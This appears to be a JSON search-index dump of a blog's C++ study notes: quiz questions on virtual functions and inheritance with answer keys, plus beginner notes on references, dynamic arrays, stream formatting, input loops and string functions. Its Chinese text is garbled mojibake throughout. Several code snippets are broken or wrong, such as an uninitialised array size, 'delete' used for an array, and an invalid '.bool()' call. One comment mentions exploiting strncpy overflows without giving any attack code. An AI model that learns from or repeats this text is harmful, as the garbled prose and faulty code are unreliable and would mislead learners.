3.åŸºç±»çš„ç±»æŒ‡é’ˆå¯æŒ‡å‘æ´¾ç”Ÿç±»ï¼Œåä¹‹ä¸è¡Œ # å¤šç»§æ‰¿ # 1.å¤šç»§æ‰¿çš„çˆ¶ç±»å¯¹è±¡æ„é€ é¡ºåºæŒ‰ç…§æ´¾ç”Ÿç±»å£°æ˜æ—¶åˆ—å‡ºçš„æ¬¡åºã€ä»å·¦åˆ°å³è°ƒç”¨\n2.å¤šç»§æ‰¿ä¸­ï¼Œå¦‚æœçˆ¶ç±»å¯¹è±¡åŒæ—¶ç»§æ‰¿åŒä¸€è™šåŸºç±»ï¼Œé‚£ä¹ˆè™šåŸºç±»çš„æ„é€ å‡½æ•°åªä¼šè°ƒç”¨ä¸€æ¬¡\né‡å†™ # é‡å†™éœ€è¦æ³¨æ„ï¼š\n1ã€ è¢«é‡å†™çš„å‡½æ•°ä¸èƒ½æ˜¯staticçš„ã€‚å¿…é¡»æ˜¯virtualçš„\n2 ã€é‡å†™å‡½æ•°å¿…é¡»æœ‰ç›¸åŒçš„ç±»å‹ï¼Œåç§°å’Œå‚æ•°åˆ—è¡¨\n3 ã€é‡å†™å‡½æ•°çš„è®¿é—®ä¿®é¥°ç¬¦å¯ä»¥ä¸åŒã€‚\nè™šå‡½æ•° # æœ‰å…³è™šå‡½æ•°å†…å®¹å‚è€ƒä»¥ä¸‹é“¾æ¥ï¼š\nè™šå‡½æ•°è¯¦è§£_~é’èä¹‹æœ«~çš„åšå®¢-CSDNåšå®¢\nc++è™šå‡½æ•°è¯¦è§£ï¼ˆä½ è‚¯å®šæ‡‚äº†ï¼‰_æˆ´ç€çœ¼é•œçœ‹ä¸æ¸…çš„åšå®¢-CSDNåšå®¢\nC++çš„ç²¾é«“â€”â€”è™šå‡½æ•°-åšå®¢\n1.\rä»¥ä¸‹å…³äºè™šå‡½æ•°çš„è¯´æ³•æ­£ç¡®çš„æ˜¯\rA.è™šå‡½æ•°ä¸èƒ½åœ¨å¦ä¸€ä¸ªç±»ä¸­è¢«å£°æ˜ä¸ºå‹å…ƒå‡½æ•°\rB.è™šå‡½æ•°åªèƒ½åœ¨ç±»å®šä¹‰çš„å‡½æ•°åŸå‹å£°æ˜ä¸­ï¼Œä¸èƒ½å†æˆå‘˜å‡½æ•°çš„å‡½æ•°ä½“å®ç°çš„æ—¶å€™å£°æ˜\rC.ä¸€ä¸ªè™šå‡½æ•°æ— è®ºè¢«å…¬æœ‰ç»§æ‰¿å¤šå°‘æ¬¡ï¼Œå®ƒä»ç„¶ä¿æŒå…¶è™šå‡½æ•°çš„ç‰¹æ€§\rD.å®šä¹‰äº†è™šå‡½æ•°åï¼Œç¨‹åºä¸­å£°æ˜çš„æŒ‡å‘åŸºç±»çš„æŒ‡é’ˆå¯ä»¥æŒ‡å‘å…¶æ´¾ç”Ÿç±»\rï¼ˆB C Dï¼‰\r2.\rä»¥ä¸‹æè¿°æ­£ç¡®çš„æ˜¯\rA.ä¸€ä¸ªç±»å¯ä»¥åœ¨ä¸€ä¸ªç±»æ—ä¸­æ—¢è¢«ç”¨ä½œè™šåŸºç±»ï¼Œä¹Ÿè¢«ç”¨ä½œéè™šåŸºç±»\rB.æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°çš„æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­å¿…é¡»åˆ—å‡ºå¯¹è™šåŸºç±»æ„é€ å‡½æ•°çš„è°ƒç”¨\rC.åœ¨æ´¾ç”Ÿç±»çš„å¯¹è±¡ä¸­ï¼ŒåŒåçš„è™šåŸºç±»åªäº§ç”Ÿä¸€ä¸ªè™šåŸºç±»å­å¯¹è±¡ï¼Œè€Œéè™šåŸºç±»äº§ç”Ÿå„è‡ªçš„å­å¯¹è±¡\rD.åœ¨ä¸€ä¸ªæˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­åŒæ—¶å‡ºç°å¯¹è™šåŸºç±»å’Œéè™šåŸºç±»æ„é€ å‡½æ•°çš„è°ƒç”¨æ—¶ï¼Œéè™šåŸºç±»çš„æ„é€ å‡½æ•°å…ˆäºè™šåŸºç±»çš„æ„é€ å‡½æ•°æ‰§è¡Œ\rï¼ˆA Cï¼‰\r3.\rä»¥ä¸‹å“ªäº›è¯´æ³•æ˜¯æ­£ç¡®çš„\rA.å¦‚æœä¸€ä¸ªå‡½æ•°åœ¨åŸºç±»ä¸­å®šä¹‰ä¸ºè™šå‡½æ•°ï¼Œåˆ™å®ƒåœ¨å…¶æ‰€æœ‰æ´¾ç”Ÿç±»ä¸­è‡ªåŠ¨ä¸ºè™šå‡½æ•°ã€‚ æ´¾ç”Ÿç±»çš„å‡½æ•°å£°æ˜ä¸­ä¸éœ€è¦æ·»åŠ å…³é”®å­—virtual\rB.å¦‚æœä¸€ä¸ªå‡½æ•°ä¸ä¼šè¢«é‡æ–°å®šä¹‰ï¼Œé‚£ä¹ˆåœ¨ä¸å°†å…¶å£°æ˜ä¸ºè™šæ‹Ÿçš„æƒ…å†µä¸‹æ•ˆç‡æ›´é«˜ï¼Œå› ä¸ºåœ¨è¿è¡Œæ—¶åŠ¨æ€ç»‘å®šè™šæ‹Ÿå‡½æ•°éœ€è¦æ›´å¤šçš„æ—¶é—´å’Œç³»ç»Ÿèµ„æº\rC.ä¸€ä¸ªè™šå‡½æ•°å¯ä»¥åœ¨å‡ ä¸ªæ´¾ç”Ÿç±»ä¸­å®ç°ã€‚ C++ åœ¨è¿è¡Œæ—¶åŠ¨æ€ç»‘å®šå‡½æ•°çš„å®ç°ï¼Œç”±å˜é‡å¼•ç”¨çš„å¯¹è±¡çš„å®é™…ç±»å†³å®šã€‚\rD.ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶æ ¹æ®å‚æ•°ç±»å‹ã€å‚æ•°ä¸ªæ•°ã€å‚æ•°çš„é¡ºåºæ‰¾åˆ°åŒ¹é…çš„å‡½æ•°\rStandard Answer: D, A, B, C\r4.\rä»¥ä¸‹å“ªäº›è¯´æ³•æ˜¯æ­£ç¡®çš„\rA.ç§æœ‰æˆå‘˜åªèƒ½ä»ç±»å†…éƒ¨è®¿é—®ï¼Œè€Œå…¬å…±æˆå‘˜å¯ä»¥ä»ä»»ä½•å…¶ä»–ç±»è®¿é—®ã€‚\rB.åŸºç±»ä¸­çš„å—ä¿æŠ¤æ•°æ®å­—æ®µæˆ–å—ä¿æŠ¤å‡½æ•°å¯ä»¥åœ¨å…¶æ´¾ç”Ÿç±»ä¸­æŒ‰åç§°è®¿é—®ã€‚\rC.ä»»ä½•å…¶ä»–ç¨‹åºéƒ½å¯ä»¥é€šè¿‡åç§°è®¿é—®ç±»ä¸­çš„å…¬å…±æ•°æ®å­—æ®µæˆ–å‡½æ•°ã€‚\rStandard Answer: A, B, C\r5.\rä»¥ä¸‹å“ªä¸ªæ˜¯æŠ½è±¡å‡½æ•°\rA.virtual double getArea();\rB.virtual double getArea()=0;\rC.double getArea()=0;\rD.double getArea();\rStandard Answer: B å¤šæ€ # å¯¹å¤šæ€è¯´æ³•æ­£ç¡®çš„æ˜¯: A.é‡‡ç”¨é™æ€ç»‘å®šæ–¹å¼è°ƒç”¨æ™®é€šæˆå‘˜å‡½æ•° B.é€šè¿‡æŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰è°ƒç”¨æ™®é€šæˆå‘˜å‡½æ•°ï¼Œä»…ä»…ä¸æŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰çš„ç±»å‹æœ‰å…³ C.ä½¿ç”¨è™šæˆå‘˜å‡½æ•°å¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æ—¶ä½¿ç”¨åŠ¨æ€ç»‘å®šæ–¹å¼ D.å½“ä½¿ç”¨æŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰è°ƒç”¨è™šå‡½æ•°æ—¶ï¼Œå®é™…è°ƒç”¨å“ªä¸ªå‡½æ•°ä¾èµ–äºè¿è¡Œæ—¶æŒ‡é’ˆæ‰€æŒ‡å‘çš„å¯¹è±¡çš„ç±»å‹ Standard Answer: A, B, C, D ç±»æ¨¡æ¿ # ç±»æ¨¡æ¿å®ä¾‹åŒ–åˆ™ä¸ºæ¨¡æ¿ç±»\n","date":"June 30, 2023","permalink":"/posts/c++/homework/c++%E7%90%86%E8%AE%BA3/","section":"Posts","summary":"explicit # å½“ä¸€ä¸ªç±»çš„æ„é€ å‡½æ•°æœ‰å¤šä¸ªå‚æ•°ï¼Œé™¤ç¬¬ä¸€ä¸ªå‚æ•°å¤–å…¶å®ƒéƒ½æœ‰é»˜è®¤","title":"C++ç†è®º3"},{"content":" 1.åŸºç¡€çŸ¥è¯†(ğŸ¶éƒ½ä¸çœ‹å¥½å§) # å¿™é‡Œå·é—²æ•´ç†ä¸€ä¸‹ä¸Šå­¦æœŸå­¦çš„c++ç›¸å…³çŸ¥è¯†ï¼Œå¸Œæœ›ä»¥åçš„è‡ªå·±ä¸ä¼šå›æ¥å¤ä¹ [doge]\nå…¶å®æ˜¯å­¦pwnå­¦ç´¯äº†ğŸ˜‡æƒ³åˆ’ä¸€ä¸‹æ°´ï¼ˆ)\nä»¥ä¸‹çš„å†…å®¹çœŸçš„æ˜¯åŸºç¡€ä¸­çš„åŸºç¡€ï¼Œè·¯è¿‡çš„å¤§ä½¬ä»¬å°±ä¸è¦æµªè´¹æ—¶é—´çœ‹äº† orzï¼Œèµ¶ç´§åˆ’åˆ°ä¸‹ä¸€ç¯‡ï¼š 2023 ciscn åˆèµ› Â· ta0lve ğŸ™ï¼‰\n1.1 å¼•ç”¨ # void use_value(int a, int b) { int temp = 0 ; temp = a; a = b; b = temp; } void use_pointer(int* a, int* b) { int temp=0; temp = *a; *a = *b; *b = temp; } void use_reference(int\u0026amp; a, int\u0026amp; b) { int temp = a; a = b ; b = temp ; } 1.1.1 å¼•ç”¨çš„è¿”å›å€¼ # #include \u0026lt;iostream\u0026gt; using namespace std; class Number { private: int val; public: Number(int n) : val(n) {} Number\u0026amp; add(int n) { val += n; return *this; } Number\u0026amp; sub(int n) { val -= n; return *this; } //è¿”å›å€¼ä¸ºNumber\u0026amp;ï¼Œè¿”å›äº†å¯¹è±¡æœ¬èº«çš„å¼•ç”¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨åç»­è°ƒç”¨ä¸­é“¾å¼ä½¿ç”¨ï¼Œn.add(2).sub(3).add(4) =\u0026gt; val+2-3+4 //å¦‚æœè¿”å›å€¼ä¸ºNumberï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„Numberå¯¹è±¡ï¼Œè€Œä¸æ˜¯å½“å‰å¯¹è±¡çš„å¼•ç”¨ï¼Œå› æ­¤éœ€è¦ç”¨ä¸´æ—¶å¯¹è±¡æ¥ä¿å­˜è¿”å›çš„ç»“æœï¼ŒåŸæ¥çš„valå€¼å¹¶æ²¡æœ‰æ”¹å˜ï¼Œè€Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„Numberå¯¹è±¡ }; 1.2 äºŒç»´æ•°ç»„çš„åŠ¨æ€åˆ†é… # 1.2.1 æ–¹å¼ä¸€ # int x,y; int *arr[x]; for(int i=0;i\u0026lt;x;i++) { arr[i] = new int [y]; } for(int i=0;i\u0026lt;x;i++) { delete [] arr[i]; } 1.2.2 æ–¹å¼äºŒ # int x,y; int **arr = new int *[x]; for(int i=0;i\u0026lt;x;i++) { arr[i] = new int [y]; } for(int i=0;i\u0026lt;x;i++) { delete [] arr[i]; } delete arr; 1.3 è¾“å…¥ä¸è¾“å‡º # 1.3.1 æ§åˆ¶è¾“å‡ºçš„æ ¼å¼ # è‹±æ–‡ç›¸å…³ï¼š\n1.iomanip\n2.setprecision()\n3.setw()\n4.scientific\n5.setfill(\u0026rsquo;*')\n#include\u0026lt;iomanip\u0026gt; //è®°å¾—å¼•å…¥å¤´æ–‡ä»¶ï¼ï¼ï¼ control the format of numeric value, 123456789.987654321 //æ ¼å¼ Default:1.23457e+08 //ç›´æ¥è¾“å‡ºæµ®ç‚¹æ•° Using fixed:123456789.987654 //fixedä¼šè§†æµ®ç‚¹æ•°çš„æ•´æ•°ä½ä¸å°æ•°ä½æ¥æ˜¯å¦é‡‡ç”¨ç§‘å­¦è®°æ•°æ³• With precision 7:123456789.9876543 // setprecision(7) ç²¾åº¦ï¼ˆå°æ•°ä½ï¼‰å‡½æ•° Scientific with precision 3:1.235e+08 //setprecision(3) \u0026lt;\u0026lt; scientific -------------------------- //ç§‘å­¦è®¡æ•°æ³•,å°æ•°ä½ä¸º3 control the base of numeric value, 16 //ä½ç½® Hex:10 //cout \u0026lt;\u0026lt; \u0026#34;Hex:\u0026#34; \u0026lt;\u0026lt; hex \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; Oct:20 //cout \u0026lt;\u0026lt; \u0026#34;Oct:\u0026#34; \u0026lt;\u0026lt; oct \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; Dec:16 //cout \u0026lt;\u0026lt; \u0026#34;Dec:\u0026#34; \u0026lt;\u0026lt; dec \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl; ------------------------------------------------- control the width and alignment, and the width is 6 spaces right aligned 1 2 4 8 //cout \u0026lt;\u0026lt; setw(6) \u0026lt;\u0026lt; num; 16 32 64 128 //if (i % 4 == 0) { 256 512 1024 2048 // cout \u0026lt;\u0026lt; endl;} 4096 8192 16384 32768 //é»˜è®¤å³å¯¹é½ left aligned 1 2 4 8 //cout \u0026lt;\u0026lt; left \u0026lt;\u0026lt; setw(6) \u0026lt;\u0026lt; num; 16 32 64 128 //å·¦åç§» 256 512 1024 2048 4096 8192 16384 32768 --------------------------------------------- control the fillment of 123456 Original: 123456 //cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; setw(9) \u0026lt;\u0026lt; \u0026#34;Original:\u0026#34; \u0026lt;\u0026lt; setw(8) Filled:**123456 //cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; setw(9) \u0026lt;\u0026lt; \u0026#34;Filled:\u0026#34; \u0026lt;\u0026lt; setfill(\u0026#39;*\u0026#39;) \u0026lt;\u0026lt; setw(8) */ 1.3.2 ä»å‘½ä»¤è¡Œè¯»å–è‹¥å¹²ä¸ªå…ƒç´ ï¼ˆæ•°é‡ä¸å®šï¼‰ # /*å®é™…ä¸Šcinæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ— è¿”å›å€¼ï¼Œè€Œè¿™ä¸ªè¿”å›å€¼æ˜¯stdä¸­é‡è½½\u0026gt;\u0026gt;è¿™ä¸ªè¿ç®—ç¬¦è¿”å›çš„ï¼Œå…¶ç±»å‹æ˜¯ä¸€ä¸ªistream\u0026amp;*/ /*istreamä½œä¸ºiosç»§æ‰¿çš„ä¸€ä¸ªç±»å‹ï¼Œå…¶ä¸­é‡è½½äº†boolè¿™ä¸ªæ“ä½œç¬¦åˆ«å,ä½¿å¾—istreamå…¶å¯¹è±¡å¯ä»¥è°ƒç”¨boolæ“ä½œç¬¦ï¼ˆç›¸å½“äºåŠ äº†ä¸€ä¸ªæœ¬ç±»å‹ä¸boolç±»å‹çš„è½¬æ¢å‡½æ•°ï¼‰ï¼Œè¯¥å‡½æ•°é€‰æ‹©æ€§çš„è¿”å›ç»™æ¡ä»¶åˆ¤æ–­è¯­å¥trueæˆ–è€…falseï¼Œæ¯”å¦‚istreamçš„å¯¹è±¡ å¦‚æœæ”¶åˆ°EOF(ctrl+z)å°±ä¼šreturn falseï¼Œè¿™ä¹Ÿè¯´æ˜äº†while(cin\u0026gt;\u0026gt;n)å½“ä¼ å…¥EOFèƒ½åœä¸‹æ¥çš„åŸå› */ while(std::cin\u0026gt;\u0026gt;x) { sum += x; size++; } while ((cin\u0026gt;\u0026gt;n).bool()) //å…¶å®åŸç†æ˜¯å‘ç”Ÿäº†boolç±»å‹è½¬æ¢ /*scanfæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„è¿”å›å€¼æ˜¯ä¸€ä¸ªintï¼Œè¯¥intä»£è¡¨scanfæˆåŠŸè¯»å–åˆ°æ•°æ®çš„ä¸ªæ•°ï¼Œæ²¡æœ‰æ•°æ®å³ä¸º0ï¼Œå¦‚æœè¯»åˆ°æ–‡ä»¶æœ«å°¾æˆ–è€…è¾“å…¥ctrl+zæ ‡å¿—è¯»å–å®Œæ¯•çš„æ—¶å€™å°±ä¼šè¯»åˆ°EOFï¼Œè¿™æ—¶å®ƒä¼šè¿”å›-1;*/ while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)\u0026gt;0) // å¤§äº0å¯ä»¥ï¼Œç­‰äº0ä¼šè¿è¡Œå´©æºƒ { sum += x; size++; } while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)!=-1) // ä¸æ˜¯EOFï¼Œä¸ç­‰äº-1ä¹Ÿå¯ä»¥ { sum += x; size++; } while(scanf(\u0026#34;%d\u0026#34;,\u0026amp;x)) // è¿”å›çš„æ˜¯-1ï¼Œä¼šå‘ç”Ÿç±»å‹è½¬æ¢å˜æˆtrue,ä¼šè¿è¡Œå´©æºƒ { sum += x; size++; } 1.4 ä¾æ¬¡è¾“å‡ºA mod Bã€AÃ·B # #include\u0026lt;iostream\u0026gt; using namespace std; int main() { int a,b; cin \u0026gt;\u0026gt; a ; cin \u0026gt;\u0026gt; b ; //è®°å¾—åˆ¤æ–­æ˜¯å¦ä¸ºé›¶ if(b==0) cout \u0026lt;\u0026lt; \u0026#34;0\\n\u0026#34; \u0026lt;\u0026lt;\u0026#34;0\\n\u0026#34;; else { //float c; float c = (float)a / (float)b; //ä¸¤å¤„ï¼ˆfloatï¼‰é€‰æ‹©ä¸€å¤„å³å¯ cout \u0026lt;\u0026lt; a % b \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; c \u0026lt;\u0026lt; endl ; } return 0; } 1.5 å­—ç¬¦ä¸²æ“ä½œ # 1.5.1 ç›¸å…³çŸ¥è¯† # #include\u0026lt;string\u0026gt; //å¤´æ–‡ä»¶ std::string s; //using namespace std; cin \u0026gt;\u0026gt; s; //ä¸€ä¸ªå•è¯ï¼Œä¸èƒ½è¯»å…¥ç©ºæ ¼ï¼Œä»¥ç©ºæ ¼ï¼Œåˆ¶è¡¨ç¬¦ï¼Œå›è½¦ç¬¦ä½œä¸ºç»“æŸæ ‡å¿— getline(cin,s); //ä¸€æ•´å¥è‹±æ–‡ï¼Œå¯ä»¥è¯»å…¥ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ï¼Œä»¥å›è½¦ç¬¦ä½œä¸ºç»“æŸçš„æ ‡å¿— string s (6, \u0026#39;a\u0026#39;);//åˆå§‹åŒ–ä¸ºç”± 6 ä¸ª\u0026#39;a\u0026#39;å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸² //è¿­ä»£å™¨å®šä¹‰ï¼ˆä¸å…¶ä»–è¿­ä»£å™¨ä¸åŒï¼‰ï¼š string::iterator it= s.begin(); for(auto itr : s)//é‡‡ç”¨autoå®ç°è¿­ä»£å™¨ //stringçš„åŸºæœ¬æ“ä½œ lengthï¼ˆï¼‰/sizeï¼ˆï¼‰;//è¿”å›stringçš„é•¿åº¦ï¼Œå³å­˜æ”¾çš„å­—ç¬¦æ•°ã€‚ int len = s.size(); int len = s.length(); //è¿™ä¸¤ç§æ–¹å¼æ˜¯ç­‰ä»·çš„ //å¯ä»¥ç”¨+å·å’Œappend()å‡½æ•°åœ¨å‡½æ•°çš„æœ«å°¾æ·»åŠ å­—ç¬¦ s += \u0026#39;a\u0026#39;; s.append(\u0026#34;a\u0026#34;);//appendåªèƒ½æ˜¯å­—ç¬¦ä¸²\u0026#34;a\u0026#34;,ä¸èƒ½æ˜¯\u0026#39;a\u0026#39; erase(pos) //åˆ é™¤ä» pos åˆ°å­—ç¬¦ä¸²ç»“æŸå¤„çš„æ‰€æœ‰å­—ç¬¦ erase(pos, n) //åˆ é™¤ä»poså¼€å§‹çš„nä¸ªå­—ç¬¦ erase(first,last) //åˆ é™¤åŒºé—´[first,last)å†…çš„æ‰€æœ‰å…ƒç´  insertï¼ˆpos,stringï¼‰;//åœ¨poså·ä½ç½®æ’å…¥å­—ç¬¦ä¸²string insertï¼ˆit,it2,it3ï¼‰;//itä¸ºåŸå­—ç¬¦ä¸²çš„æ¬²æ’å…¥ä½ç½®ï¼Œit2å’Œit3ä¸ºå¾…æ’å­—ç¬¦ä¸²çš„é¦–å°¾è¿­ä»£å™¨ string str = \u0026#34;abcxyz\u0026#34;,str2 = \u0026#34;opq\u0026#34;; str.insert(str.begin()+3,str2.begin(),str2.end()); substr(pos,len);//æå–å­—ç¬¦ä¸²ï¼Œè¿”å›ä»poså·ä½å¼€å§‹ï¼Œé•¿åº¦ä¸ºlençš„å­—ä¸² str.find(str2);//å½“str2æ˜¯strçš„å­—ä¸²æ—¶ï¼Œè¿”å›å…¶åœ¨strä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœä¸æ˜¯å°±è¿”å›string::nposã€‚ str.find(str2,pos);//ä»strçš„poså·ä½å¼€å§‹åŒ¹é…str2ï¼Œè¿”å›å€¼ä¸ä¸Šç›¸åŒ str.replace(pos,len,str2);//æŠŠsträ»poså·ä½å¼€å§‹ã€é•¿åº¦ä¸ºlençš„å­—ä¸²æ›¿æ¢ä¸ºstr2. str.replace(it1,it2,str2);//æŠŠstrçš„è¿­ä»£å™¨[it1,it2)èŒƒå›´çš„å­—ä¸²æ›¿æ¢ä¸ºstr2. empty()//æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©º clear()//æ¸…ç©ºå­—ç¬¦ä¸² 1.5.1_è¡¥å……ï¼šc é£æ ¼çš„char arr[n] çš„å­—ç¬¦ä¸²æ“ä½œ # strlen(char const *string) //è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ char *strcpy(char *dst , char const *src);//å­—ç¬¦ä¸²å¤åˆ¶ char *strncpy(char *dst , char const *src , size_t len) /* 1ï¼‰å¦‚æœ strlen(src) \u0026gt; lenï¼Œåˆ™åªæœ‰ len ä¸ªå­—ç¬¦è¢«å¤åˆ¶åˆ° dst ä¸­å»ï¼Œæ­¤æ—¶ dst å°†ä¸ä¼šä»¥ NUL å­—èŠ‚ç»“å°¾ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œstrncpy è°ƒç”¨çš„ç»“æœå¯èƒ½ä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼› 2ï¼‰å¦‚æœ strlen(src) \u0026lt; lenï¼Œåˆ™ src ä¸­çš„å­—ç¬¦å…¨è¢«å¤åˆ¶åˆ° dst ä¸­å»ï¼Œdst ä¸­å‰©ä½™çš„éƒ¨åˆ†ç”¨ NUL å¡«å……ã€‚ 3)å¦‚æœ len \u0026gt;strlen(dst),ä»ç„¶ä¼šå‘ç”Ÿæ•°æ®æº¢å‡ºè¦†ç›–å¼•å‘å®‰å…¨æ¼æ´ï¼Œå¯ä»¥è¿›è¡Œpwnæ¼æ´åˆ©ç”¨ */ char *strcat(char *dst,char const *src);//è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸² int strcmp(char const *s1 , char sonst *s2);//æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸² int *strncmp(char const *s1 , char const *s2 , size_t len); /*å¯ä»¥ä½¿ç”¨ strncmp å‡½æ•°é™å®šæ¯”è¾ƒçš„å­—ç¬¦çš„ä¸ªæ•°ï¼Œ è¿”å›å€¼ä¸ strcmp ä¸€æ ·ï¼Œä½†æ˜¯åªé’ˆå¯¹å‰ len ä¸ªå­—ç¬¦è¿›è¡Œæ¯”è¾ƒã€‚*/ char *strchr(char const *str,int ch);ã€€// int ch æ˜¯å­—ç¬¦çš„ASCIIç å€¼ char *strrchr(char const *str,int ch); /*å‡½æ•° strchr åœ¨å­—ç¬¦ä¸² str ä¸­æŸ¥æ‰¾å­—ç¬¦ ch ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥ä½ç½®çš„æŒ‡é’ˆï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°ç›¸åº”çš„å­—ç¬¦ï¼Œåˆ™è¿”å›ä¸€ä¸ª NULL æŒ‡é’ˆã€‚ å‡½æ•° strrchr åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾å­—ç¬¦ ch æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›æŒ‡å‘è¯¥ä½ç½®çš„æŒ‡é’ˆã€‚*/ char *strpbrk(char const *str , char const *group); /*æŸ¥æ‰¾ä»»ä½•ä¸€ç»„å­—ç¬¦ç¬¬ä¸€æ¬¡åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®,è¿”å›ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸² str ä¸­ç¬¬ä¸€ä¸ªåŒ¹é… group ä¸­ä»»ä½•ä¸€ä¸ªå­—ç¬¦çš„å­—ç¬¦ä½ç½®ï¼Œ(åªè¦å‡ºç°å…¶ä¸­ä»»æ„ä¸€ä¸ªéƒ½å¯ä»¥ï¼ï¼)å¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ï¼Œåˆ™è¿”å›ä¸€ä¸ª NULL æŒ‡é’ˆã€‚*/ char *strstr(char const *str1 , char const *str2); /*è¿™ä¸ªå‡½æ•°åœ¨ str1 ä¸­æŸ¥æ‰¾æ•´ä¸ªå­—ç¬¦ä¸² str2 ç¬¬ä¸€æ¬¡å‡ºç°çš„èµ·å§‹ä½ç½®ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥ä½ç½®çš„æŒ‡é’ˆï¼›å¦‚æœ str2 å¹¶æ²¡æœ‰å®Œæ•´çš„å‡ºç°åœ¨ str1 ä¸­ï¼Œåˆ™å‡½æ•°å°†è¿”å›ä¸€ä¸ª NULL æŒ‡é’ˆï¼›å¦‚æœ str2 æ˜¯ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›str1.*/ 1.5.2 å¯¹å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦æ“ä½œ # //1.auto c:s for(auto c:s) { if(c \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } //2.s[i] for(int i=0;i\u0026lt;s.length(); i++) { if(s[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } //è‹¥ä¸ºcé£æ ¼çš„char arr[n]å­—ç¬¦ä¸²ï¼Œåˆ™ç”¨strlen()å‡½æ•° for(int i=0;i\u0026lt;strlen(arr); i++) { if(arr[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp;c \u0026lt;=\u0026#39;z\u0026#39;) } 1.5.3 stringstreamå­¦ä¹ ï¼ˆéè¯¾å ‚çŸ¥è¯†ï¼‰ # 1.ä½¿ç”¨æ–¹æ³•\n//ä½¿ç”¨stringstreaméœ€è¦å¼•å…¥\u0026lt;sstream\u0026gt;å¤´æ–‡ä»¶ stringstream//å¯¹è±¡(ss)å¸¸ä½¿ç”¨çš„ä¸¤ä¸ªæ–¹æ³• ss.clear()//æ¸…é™¤æµçš„çŠ¶æ€æ ‡å¿—ï¼Œä½†ä¸ä¼šæ”¹å˜æµä¸­çš„å†…å®¹ã€‚ ss.str(\u0026#34;\u0026#34;)//æ¸…ç©ºæµä¸­çš„æ•°æ®ï¼Œç›¸å½“äºæ— è®ºä¹‹å‰æµä¸­çš„æ•°æ®æ˜¯ä»€ä¹ˆï¼Œä½¿ç”¨str(\u0026#34;\u0026#34;)ä¹‹åï¼Œæµæ•°æ®ä¸ºç©ºï¼Œå¹¶ä¸”å°†çŠ¶æ€ç¬¦å›ºå®šã€‚ ss.str() //è¿”å›stringsteamä¸­ç®¡ç†çš„å…¨éƒ¨stringå†…å®¹ /*æ³¨æ„: å¯¹åŒä¸€ä¸ªstringstreamå¯¹è±¡é‡å¤èµ‹å€¼æ—¶ï¼Œå°±éœ€è¦å…ˆå¯¹æµä½¿ç”¨clear()å‡½æ•°æ¸…ç©ºæµçš„çŠ¶æ€ï¼Œæ­¤æ—¶æµå ç”¨çš„å†…å­˜æ²¡æœ‰æ”¹å˜ï¼Œä¼šä¸€ç›´å¢åŠ (stringstreamä¸ä¸»åŠ¨é‡Šæ”¾å†…å­˜)ï¼Œè‹¥æƒ³æ”¹å˜å†…å­˜(ä¸€èˆ¬æ˜¯æ¸…é™¤å†…å­˜ï¼Œå‡å°‘å†…å­˜æ¶ˆè€—)ï¼Œéœ€è¦å†é…åˆä½¿ç”¨str(\u0026#34;\u0026#34;)æ¸…ç©ºstringstreamçš„ç¼“å­˜ */ //æ•°å­— -\u0026gt; stringstreamå¯¹è±¡ -\u0026gt; string //ä¸éœ€è¦ç”¨tostring()è¿™äº›å†…ç½®å‡½æ•° //ï¼ˆæ­¤æ–¹æ³•å…·æœ‰æ™®éé€‚ç”¨æ€§ï¼‰ int main() { stringstream ss; string str; int num= 1000; // å°†intç±»å‹çš„å€¼æ”¾å…¥è¾“å…¥æµä¸­ ss \u0026lt;\u0026lt; num; // ä»sstreamä¸­æŠ½å–å‰é¢æ’å…¥çš„intç±»å‹çš„å€¼ï¼Œèµ‹ç»™stringç±»å‹ ss \u0026gt;\u0026gt; str; 